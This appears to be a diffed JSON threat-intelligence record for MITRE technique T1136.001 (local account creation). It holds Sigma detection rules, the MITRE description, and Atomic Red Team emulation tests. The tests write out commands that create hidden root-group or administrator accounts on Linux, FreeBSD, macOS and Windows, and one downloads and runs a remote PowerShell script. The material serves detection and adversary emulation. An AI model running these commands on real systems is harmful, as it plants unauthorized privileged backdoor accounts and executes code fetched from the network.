+                            "raw": "author: Endgame, JHasenbusch (adapted to Sigma for oscd.community)\ndate: 2018/10/30\ndescription: Identifies the creation of local users via the net.exe command.\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains|all:\n    - user\n    - add\n    Image|endswith:\n    - \\net.exe\n    - \\net1.exe\nfalsepositives:\n- Legitimate user creation.\n- Better use event IDs for user creation rather than command line rules.\nfields:\n- ComputerName\n- User\n- CommandLine\nid: cd219ff3-fa99-45d4-8380-a7d15116c6dc\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/02/02\nreferences:\n- https://eqllib.readthedocs.io/en/latest/analytics/014c3f51-89c6-40f1-ac9c-5688f26090ab.html\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1136.001/T1136.001.md\nrelated:\n- id: b9f0e6f5-09b4-4358-bae4-08408705bd5c\n  type: similar\nstatus: test\ntags:\n- attack.persistence\n- attack.t1136.001\ntitle: New User Created Via Net.EXE\n",
+                            "sigma:id": "cd219ff3-fa99-45d4-8380-a7d15116c6dc",
+                            "title": "New User Created Via Net.EXE",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "0ac15ec3-d24f-4246-aa2a-3077bb1cf90e",
+                        "lookup_data": {
+                            "description": "Detects the addition of a new user to a privileged group such as \"root\" or \"sudo\"",
+                            "raw": "author: Pawel Mazur\ndate: 2022/12/21\ndescription: Detects the addition of a new user to a privileged group such as \"root\"\n  or \"sudo\"\ndetection:\n  condition: all of selection_*\n  selection_new_user:\n  - new user\n  selection_uids_gids:\n  - GID=0\n  - UID=0\n  - GID=10\n  - GID=27\nfalsepositives:\n- Administrative activity\nid: 0ac15ec3-d24f-4246-aa2a-3077bb1cf90e\nlevel: high\nlogsource:\n  definition: /var/log/secure on REHL systems or /var/log/auth.log on debian like\n    Systems needs to be collected in order for this detection to work\n  product: linux\nreferences:\n- https://digital.nhs.uk/cyber-alerts/2018/cc-2825\n- https://linux.die.net/man/8/useradd\n- https://github.com/redcanaryco/atomic-red-team/blob/25acadc0b43a07125a8a5b599b28bbc1a91ffb06/atomics/T1136.001/T1136.001.md#atomic-test-5---create-a-new-user-in-linux-with-root-uid-and-gid\nstatus: experimental\ntags:\n- attack.persistence\n- attack.t1136.001\n- attack.t1098\ntitle: Privileged User Has Been Created\n",
+                            "sigma:id": "0ac15ec3-d24f-4246-aa2a-3077bb1cf90e",
+                            "title": "Privileged User Has Been Created",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "635cbe30-392d-4e27-978e-66774357c762",
+                        "lookup_data": {
+                            "mitre-attack-id": "T1136.001",
+                            "mitre-cti:description": "Adversaries may create a local account to maintain access to victim systems. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service. With a sufficient level of access, the <code>net user /add</code> command can be used to create a local account. On macOS systems the <code>dscl -create</code> command can be used to create a local account.\n\nSuch accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.",
+                            "mitre-cti:name": "Local Account",
+                            "mitre-cti:type": "attack-pattern",
+                            "raw": "{'x_mitre_platforms': ['Linux', 'macOS', 'Windows'], 'x_mitre_domains': ['enterprise-attack'], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'id': 'attack-pattern--635cbe30-392d-4e27-978e-66774357c762', 'type': 'attack-pattern', 'created': '2020-01-28T13:50:22.506Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'external_references': [{'source_name': 'mitre-attack', 'external_id': 'T1136.001', 'url': 'https://attack.mitre.org/techniques/T1136/001'}, {'source_name': 'Microsoft User Creation Event', 'description': 'Lich, B., Miroshnikov, A. (2017, April 5). 4720(S): A user account was created. Retrieved June 30, 2017.', 'url': 'https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4720'}], 'modified': '2021-08-12T13:04:14.248Z', 'name': 'Local Account', 'description': 'Adversaries may create a local account to maintain access to victim systems. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service. With a sufficient level of access, the <code>net user /add</code> command can be used to create a local account. On macOS systems the <code>dscl -create</code> command can be used to create a local account.\\n\\nSuch accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.', 'kill_chain_phases': [{'kill_chain_name': 'mitre-attack', 'phase_name': 'persistence'}], 'x_mitre_detection': 'Monitor for processes and command-line parameters associated with local account creation, such as <code>net user /add</code> , <code>useradd</code> , and <code>dscl -create</code> . Collect data on account creation within a network. Event ID 4720 is generated when a user account is created on a Windows system. (Citation: Microsoft User Creation Event) Perform regular audits of local system accounts to detect suspicious accounts that may have been created by an adversary.', 'x_mitre_is_subtechnique': True, 'x_mitre_version': '1.1', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'x_mitre_data_sources': ['Command: Command Execution', 'User Account: User Account Creation', 'Process: Process Creation'], 'x_mitre_permissions_required': ['Administrator']}",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "1bbf25b9-8038-4154-a50b-118f2a32be27",
+                        "lookup_data": {
+                            "description": "Detects the creation of suspicious accounts similar to ANONYMOUS LOGON, such as using additional spaces. Created as an covering detection for exclusion of Logon Type 3 from ANONYMOUS LOGON accounts.",
+                            "raw": "author: James Pemberton / @4A616D6573\ndate: 2019/10/31\ndescription: Detects the creation of suspicious accounts similar to ANONYMOUS LOGON,\n  such as using additional spaces. Created as an covering detection for exclusion\n  of Logon Type 3 from ANONYMOUS LOGON accounts.\ndetection:\n  condition: selection\n  selection:\n    EventID: 4720\n    SamAccountName|contains|all:\n    - ANONYMOUS\n    - LOGON\nfalsepositives:\n- Unknown\nid: 1bbf25b9-8038-4154-a50b-118f2a32be27\nlevel: high\nlogsource:\n  product: windows\n  service: security\nmodified: 2022/10/09\nreferences:\n- https://twitter.com/SBousseaden/status/1189469425482829824\nstatus: test\ntags:\n- attack.persistence\n- attack.t1136.001\n- attack.t1136.002\ntitle: Suspicious Windows ANONYMOUS LOGON Local Account Created\n",
+                            "sigma:id": "1bbf25b9-8038-4154-a50b-118f2a32be27",
+                            "title": "Suspicious Windows ANONYMOUS LOGON Local Account Created",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "6d844f0f-1c18-41af-8f19-33e7654edfc3",
+                        "lookup_data": {
+                            "description": "Find local accounts being created or modified as well as remote authentication configurations",
+                            "raw": "author: Austin Clark\ndate: 2019/08/12\ndescription: Find local accounts being created or modified as well as remote authentication\n  configurations\ndetection:\n  condition: keywords\n  keywords:\n  - username\n  - aaa\nfalsepositives:\n- When remote authentication is in place, this should not change often\nfields:\n- CmdSet\nid: 6d844f0f-1c18-41af-8f19-33e7654edfc3\nlevel: high\nlogsource:\n  product: cisco\n  service: aaa\nmodified: 2023/01/04\nstatus: test\ntags:\n- attack.persistence\n- attack.t1136.001\n- attack.t1098\ntitle: Cisco Local Accounts\n",
+                            "sigma:id": "6d844f0f-1c18-41af-8f19-33e7654edfc3",
+                            "title": "Cisco Local Accounts",
+                            "_cycat_type": "Item"
+                        }
+                    }
+                ]
+            }
+        },
+        "atomics": [
+            {
+                "attack_technique": "T1136.001",
+                "display_name": "Create Account: Local Account",
+                "atomic_tests": [
+                    {
+                        "name": "Create a user account on a Linux system",
+                        "auto_generated_guid": "40d8eabd-e394-46f6-8785-b9bfa1d011d2",
+                        "description": "Create a user via useradd\n",
+                        "supported_platforms": [
+                            "linux"
+                        ],
+                        "input_arguments": {
+                            "username": {
+                                "description": "Username of the user to create",
+                                "type": "string",
+                                "default": "evil_user"
+                            }
+                        },
+                        "executor": {
+                            "command": "useradd -M -N -r -s /bin/bash -c evil_account #{username}\n",
+                            "cleanup_command": "userdel #{username}\n",
+                            "name": "bash",
+                            "elevation_required": true
+                        }
+                    },
+                    {
+                        "name": "Create a user account on a FreeBSD system",
+                        "auto_generated_guid": "a39ee1bc-b8c1-4331-8e5f-1859eb408518",
+                        "description": "Create a user via pw\n",
+                        "supported_platforms": [
+                            "linux"
+                        ],
+                        "input_arguments": {
+                            "username": {
+                                "description": "Username of the user to create",
+                                "type": "string",
+                                "default": "evil_user"
+                            }
+                        },
+                        "executor": {
+                            "command": "pw useradd #{username} -s /usr/sbin/nologin -d /nonexistent -c evil_account\n",
+                            "cleanup_command": "rmuser -y #{username}\n",
+                            "name": "sh",
+                            "elevation_required": true
+                        }
+                    },
+                    {
+                        "name": "Create a user account on a MacOS system",
+                        "auto_generated_guid": "01993ba5-1da3-4e15-a719-b690d4f0f0b2",
+                        "description": "Creates a user on a MacOS system with dscl\n",
+                        "supported_platforms": [
+                            "macos"
+                        ],
+                        "input_arguments": {
+                            "username": {
+                                "description": "Username of the user to create",
+                                "type": "string",
+                                "default": "evil_user"
+                            },
+                            "realname": {
+                                "description": "'realname' to record when creating the user",
+                                "type": "string",
+                                "default": "Evil Account"
+                            }
+                        },
+                        "executor": {
+                            "command": "dscl . -create /Users/#{username}\ndscl . -create /Users/#{username} UserShell /bin/zsh\ndscl . -create /Users/#{username} RealName \"#{realname}\"\ndscl . -create /Users/#{username} UniqueID \"1010\"\ndscl . -create /Users/#{username} PrimaryGroupID 80\ndscl . -create /Users/#{username} NFSHomeDirectory /Users/#{username}\n",
+                            "cleanup_command": "dscl . -delete /Users/#{username}\n",
+                            "name": "bash",
+                            "elevation_required": true
+                        }
+                    },
+                    {
+                        "name": "Create a new user in a command prompt",
+                        "auto_generated_guid": "6657864e-0323-4206-9344-ac9cd7265a4f",
+                        "description": "Creates a new user in a command prompt. Upon execution, \"The command completed successfully.\" will be displayed. To verify the\nnew account, run \"net user\" in powershell or CMD and observe that there is a new user named \"T1136.001_CMD\"\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "username": {
+                                "description": "Username of the user to create",
+                                "type": "string",
+                                "default": "T1136.001_CMD"
+                            },
+                            "password": {
+                                "description": "Password of the user to create",
+                                "type": "string",
+                                "default": "T1136.001_CMD!"
+                            }
+                        },
+                        "executor": {
+                            "command": "net user /add \"#{username}\" \"#{password}\"\n",
+                            "cleanup_command": "net user /del \"#{username}\" >nul 2>&1\n",
+                            "name": "command_prompt",
+                            "elevation_required": true
+                        }
+                    },
+                    {
+                        "name": "Create a new user in PowerShell",
+                        "auto_generated_guid": "bc8be0ac-475c-4fbf-9b1d-9fffd77afbde",
+                        "description": "Creates a new user in PowerShell. Upon execution, details about the new account will be displayed in the powershell session. To verify the\nnew account, run \"net user\" in powershell or CMD and observe that there is a new user named \"T1136.001_PowerShell\"\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "username": {
+                                "description": "Username of the user to create",
+                                "type": "string",
+                                "default": "T1136.001_PowerShell"
+                            }
+                        },
+                        "executor": {
+                            "command": "New-LocalUser -Name \"#{username}\" -NoPassword\n",
+                            "cleanup_command": "Remove-LocalUser -Name \"#{username}\" -ErrorAction Ignore\n",
+                            "name": "powershell",
+                            "elevation_required": true
+                        }
+                    },
+                    {
+                        "name": "Create a new user in Linux with `root` UID and GID.",
+                        "auto_generated_guid": "a1040a30-d28b-4eda-bd99-bb2861a4616c",
+                        "description": "Creates a new user in Linux and adds the user to the `root` group. This technique was used by adversaries during the Butter attack campaign.\n",
+                        "supported_platforms": [
+                            "linux"
+                        ],
+                        "input_arguments": {
+                            "username": {
+                                "description": "Username of the user to create",
+                                "type": "string",
+                                "default": "butter"
+                            },
+                            "password": {
+                                "description": "Password of the user to create",
+                                "type": "string",
+                                "default": "BetterWithButter"
+                            }
+                        },
+                        "executor": {
+                            "command": "useradd -g 0 -M -d /root -s /bin/bash #{username}\nif [ $(cat /etc/os-release | grep -i 'Name=\"ubuntu\"') ]; then echo \"#{username}:#{password}\" | sudo chpasswd; else echo \"#{password}\" | passwd --stdin #{username}; fi;\n",
+                            "cleanup_command": "userdel #{username}\n",
+                            "name": "bash",
+                            "elevation_required": true
+                        }
+                    },
+                    {
+                        "name": "Create a new user in FreeBSD with `root` GID.",
+                        "auto_generated_guid": "d141afeb-d2bc-4934-8dd5-b7dba0f9f67a",
+                        "description": "Creates a new user in FreeBSD and adds the user to the `root` group. This technique was used by adversaries during the Butter attack campaign.\n",
+                        "supported_platforms": [
+                            "linux"
+                        ],
+                        "input_arguments": {
+                            "username": {
+                                "description": "Username of the user to create",
+                                "type": "string",
+                                "default": "butter"
+                            },
+                            "password": {
+                                "description": "Password of the user to create",
+                                "type": "string",
+                                "default": "BetterWithButter"
+                            }
+                        },
+                        "executor": {
+                            "command": "pw useradd #{username} -g 0 -d /root -s /bin/sh\necho \"#{password}\" | pw usermod #{username} -h 0\n",
+                            "cleanup_command": "pw userdel #{username}\n",
+                            "name": "sh",
+                            "elevation_required": true
+                        }
+                    },
+                    {
+                        "name": "Create a new Windows admin user",
+                        "auto_generated_guid": "fda74566-a604-4581-a4cc-fbbe21d66559",
+                        "description": "Creates a new admin user in a command prompt.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "username": {
+                                "description": "Username of the user to create",
+                                "type": "string",
+                                "default": "T1136.001_Admin"
+                            },
+                            "password": {
+                                "description": "Password of the user to create",
+                                "type": "string",
+                                "default": "T1136_pass"
+                            }
+                        },
+                        "executor": {
+                            "command": "net user /add \"#{username}\" \"#{password}\"\nnet localgroup administrators \"#{username}\" /add\n",
+                            "cleanup_command": "net user /del \"#{username}\" >nul 2>&1\n",
+                            "name": "command_prompt",
+                            "elevation_required": true
+                        }
+                    },
+                    {
+                        "name": "Create a new Windows admin user via .NET",
+                        "auto_generated_guid": "2170d9b5-bacd-4819-a952-da76dae0815f",
+                        "description": "Creates a new admin user in a powershell session without using net.exe\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/0xv1n/dotnetfun/9b3b0d11d1c156909c0b1823cff3004f80b89b1f/Persistence/CreateNewLocalAdmin_ART.ps1')",
+                            "name": "powershell",
+                            "elevation_required": true
+                        }
+                    }
+                ]
+            }
+        ]
+    },
+    "timestamp": "2025-02-28 13:30:59"
+}
